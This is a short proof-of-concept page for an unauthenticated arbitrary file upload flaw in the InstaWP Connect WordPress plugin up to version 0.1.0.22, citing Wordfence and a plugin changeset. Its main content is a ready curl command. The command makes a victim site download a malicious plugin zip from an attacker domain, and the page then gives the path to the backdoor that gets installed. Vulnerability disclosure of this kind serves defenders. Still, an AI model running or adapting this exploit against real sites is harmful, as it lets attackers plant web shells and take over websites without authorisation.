# InstaWP Connect – 1-click WP Staging & Migration <= 0.1.0.22 - Unauthenticated Arbitrary File Upload

## POC (Using CURL):

```
curl --data "api_key=123&override_plugin_zip=http://attacker-domain/malicious-plugin.zip" "http://victim-domain/?rest_route=/instawp-connect/v1/config"
```

`api_key` -> You can use any valid or invalid API Key.\
`override_plugin_zip` -> Path to the zip file which contains malicious WordPress Plugin with a backdoor.

Once imported you can access the backdoor via http://victim-domain/wp-content/plugins/malicious-plugin/backdoor.php (Assuming the directory name is malicious-plugin and backdoor.php is under that directory)

References:
- https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/instawp-connect/instawp-connect-1-click-wp-staging-migration-01022-unauthenticated-arbitrary-file-upload
- https://plugins.trac.wordpress.org/changeset?sfp_email=&sfph_mail=&reponame=&old=3061039%40instawp-connect&new=3061039%40instawp-connect&sfp_email=&sfph_mail=
